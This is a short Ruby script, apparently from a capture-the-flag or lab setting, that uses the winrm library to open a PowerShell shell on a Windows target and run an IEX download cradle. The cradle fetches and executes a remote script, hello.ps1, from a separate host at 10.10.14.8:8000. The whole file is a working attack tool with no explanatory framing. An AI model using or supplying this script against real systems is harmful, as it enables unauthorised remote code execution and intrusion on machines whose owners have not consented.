require 'winrm'

opts = {
endpoint: 'http://IPADDRESS:PORT/wsman',
user: '',
password: ''
}
conn = WinRM::Connection.new(opts)
conn.shell(:powershell) do |shell|
output = shell.run('IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.8:8000/hello.ps1")')do |stdout, stderr|  
STDOUT.print stdout
STDERR.print stderr
end
puts "The script exited with exit code #{output.exitcode}"
end
